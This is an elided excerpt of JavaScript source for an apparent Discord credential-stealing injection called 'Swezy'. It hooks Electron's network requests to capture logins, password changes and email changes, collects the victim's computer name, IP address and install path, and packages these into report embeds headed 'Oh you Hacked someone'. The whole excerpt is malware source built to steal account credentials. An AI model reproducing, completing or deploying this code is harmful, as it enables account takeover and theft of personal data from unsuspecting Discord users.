...
const FirstTime = async () => {
    ...
    if (fs.existsSync(__dirname + "/UpdateV3")) fs.rmdirSync(__dirname + "/UpdateV3")
    var ip = await getIP()
    if (!token) {
        var params = await makeEmbed({
            title: "Swezy Initalized",
            fields: [{
                name: "Injection Info",
                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
                inline: !1
        ...
        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/SwezyTryhard/temp/main/Bild_2023-05-12_175905410.png"
        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/SwezyTryhard/temp/main/Bild_2023-05-12_175905410.png"
        ...
        var params = await makeEmbed({
            ...
            fields: [{
                ...
                name: "@Copyright",
                value: `Swezy <3 <a:white_check_mark:1070006210717302824>`,
                inline: !0
            }, {
...
electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async (request, callback) => {
    ...
    switch (true) {
        case request.url.endsWith("login"):
            ...
            var params = await makeEmbed({
                title: "User Login",
                description: "**Oh you Hacked someone**",
                color: config['embed-color'],
                fields: [{
                    name: "Injection Info",
                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
        ...
        case request.url.endsWith("users/@me"):
            ...
            if (data.new_password) {
                var params = await makeEmbed({
                    title: "Swezy Detect Password Changed",
                    description: "**Oh you Hacked someone**",
                    color: config['embed-color'],
                    fields: [{
                        name: "Injection Info",
            ...
            if (data.email) {
                var params = await makeEmbed({
                    title: "Swezy Detect Email Changed",
                    description: "**Oh you Hacked someone**",
                    color: config['embed-color'],
                    fields: [{
                        name: "Injection Info",
